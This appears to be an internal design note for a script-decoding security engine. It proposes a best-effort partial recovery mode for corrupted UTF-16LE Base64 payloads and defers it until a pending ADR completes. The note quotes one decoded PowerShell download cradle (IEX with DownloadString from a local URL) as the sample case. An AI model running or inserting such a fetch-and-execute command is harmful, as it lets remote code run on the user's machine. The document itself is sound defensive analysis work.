# Pattern candidate · P-BEST-EFFORT-PARTIAL-RECOVERY

**First observed:** 2026-02-28. Production case `nivxray.nivxforge.com`.

## Observation
Operator supplied a Base64 blob that was corrupted mid-payload
(`utf16le_strict` failed at byte offset 80). The engine's current
`PARTIAL_RECOVERY · DIAGNOSTIC ONLY` decoder halted at the first
corruption point, recovering only the clean 34-byte prefix
`iex (New-Object S`. Operator confirmed the actual intended decoded
output was:

```
IEX (New-Object NetWebclient)DownloadString('http://127.0.0.1:32467/')
```

i.e. the engine COULD have reconstructed ~70 more bytes of useful
context if it had continued past the first corruption point using a
resync heuristic.

## Gap
Current engine trades off recovery breadth for hallucination safety.
That was the right ADR-0007 choice for verdict severity, but it's
overly conservative for the decoder's diagnostic layer.

## Proposed capability (candidate ADR-0012)
Add a best-effort partial recovery mode that:
1. Continues UTF-16LE decoding past corruption points using a resync
   heuristic (e.g. even-offset zero-byte alignment).
2. Emits every byte with `verified: true | false | reconstructed`
   provenance.
3. Never promotes the reconstruction to `recovered_script`.
4. Surfaces as a new `decoder.partial_recovery` Evidence type in the
   CIM (ADR-0009 §2.1.a) with `confidence: "Possible"` at most.
5. Attaches to Assessments only as supporting-not-driving evidence
   (ADR-0007 §2.3 structural class).

## Why NOT act on it now
- Track A locked contract only just closed.
- ADR-0011 (Investigation Engine Unification) is the pending Phase 0
  planning gate.
- Adding a new decoder capability before engine unification lands would
  fork the reasoning layer again.

## Draft trigger
After ADR-0011 execution completes. Then this becomes ADR-0012.
